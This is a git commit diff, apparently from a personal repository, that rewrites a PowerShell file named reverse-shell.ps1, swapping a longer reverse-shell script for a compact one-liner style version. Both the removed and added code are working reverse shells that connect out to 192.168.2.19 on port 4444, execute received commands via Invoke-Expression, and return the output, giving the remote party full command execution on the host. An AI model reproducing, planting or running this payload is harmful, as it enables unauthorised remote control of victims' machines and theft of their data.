a3db82a75f006ed3795963dca769a5be3f177577
Israel Hall Leighton <leightonisrael2014@gmail.com>
2024-07-04 12:17:14 -0300

    Update reverse-shell.ps1

--- reverse-shell.ps1
+++ reverse-shell.ps1
@@ -1,32 +1,12 @@
-# reverse-shell.ps1
-$client = New-Object System.Net.Sockets.TCPClient("192.168.2.19", 4444)
-$stream = $client.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
-$buffer = New-Object System.Byte[] 1024
-$encoding = New-Object System.Text.AsciiEncoding
-
-$writer.Write([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("U3RhdHR1cwo=")))  # Just to signify the start of the session
-$writer.Flush()
-
-while ($true) {
-    $writer.Flush()
-    $read = $null
-    $pos = 0
-    
-    while ($pos -lt $buffer.Length -and ($read = $stream.Read($buffer, $pos, $buffer.Length - $pos)) -gt 0) {
-        $pos += $read
-        if ($buffer[($pos - 1)] -eq 10) { break }
-    }
-    
-    $line = $encoding.GetString($buffer, 0, $pos - 1)
-    
-    try {
-        $output = Invoke-Expression -Command $line 2>&1 | Out-String
-    }
-    catch {
-        $output = $_.Exception.ToString()
-    }
-    
-    $writer.Write($output)
-    $writer.Flush()
-}
+$client = New-Object System.Net.Sockets.TCPClient('192.168.2.19',4444);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = ([text.encoding]::ASCII).GetString($bytes,0, $i);
+    $sendback = iex $data 2>&1 | Out-String;
+    $sendback2 = ($sendback + 'PS ' + (pwd).Path + '> ');
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close();
